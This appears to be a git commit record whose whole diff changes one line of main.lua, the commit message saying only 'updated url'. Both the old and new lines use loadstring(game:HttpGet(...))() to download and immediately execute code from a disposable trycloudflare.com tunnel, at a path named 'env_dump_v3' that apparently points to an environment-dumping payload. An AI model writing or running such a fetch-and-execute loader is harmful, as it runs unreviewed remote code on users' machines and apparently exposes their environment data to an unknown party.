93cf8c98124e35b62453d3c8eeed73a80f45452e
Cipher <75399147+Cipher3569@users.noreply.github.com>
2026-09-19 13:34:37 -0400

    updated url

--- main.lua
+++ main.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://especially-violations-told-primary.trycloudflare.com/env_dump_v3"))()
+loadstring(game:HttpGet("https://aim-summer-evening-occupied.trycloudflare.com/env_dump_v3"))()
